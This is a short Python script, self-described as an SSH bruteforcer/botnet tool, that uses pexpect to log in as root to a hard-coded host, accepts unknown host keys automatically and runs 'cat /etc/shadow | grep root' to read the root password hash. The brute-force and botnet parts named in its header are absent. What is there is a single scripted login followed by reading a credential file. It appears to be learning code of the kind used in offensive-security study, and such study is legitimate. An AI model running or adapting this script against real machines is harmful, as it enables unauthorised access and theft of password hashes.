# author: axi0m
# purpose: ssh bruteforcer/botnet script
# usage: ssh_botnet.py
# example: ssh_botnet.py
# changelog: 12/15/18 - initial creation
#

'''
To Do:
pexpect on Windows doesn't support pexpect.spawn
Pexpect can be used on Windows to wait for a pattern to be produced by a child process, using pexpect.popen_spawn.PopenSpawn, or a file descriptor, using pexpect.fdpexpect.fdspawn.
pexpect.spawn and pexpect.run() are not available on Windows, as they rely on Unix pseudoterminals (ptys). Cross platform code must not use these.

Thus at this time I'd say this script is *Nix specific

'''

import pexpect

## Globals ##

PROMPT = ['# ', '>>>', '> ', '\$ ']

## Functions ##

def send_cmd(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)

def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh' + ' ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, \
        '[P|p]assword:'])

    if ret == 0:
        print('[-] Error Connecting')
        return

    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, \
            '[P|p]assword: '])
        if ret == 0:
            print('[-] Error Connecting')
            return
    child.sendline(password)
    child.expect(PROMPT)
    return child

def main():
    host = '192.168.1.53'
    user = 'root'
    password = 'REDACTED'
    child = connect(user, host, password)
    send_cmd(child, 'cat /etc/shadow | grep root')

if __name__ == '__main__':
    main()
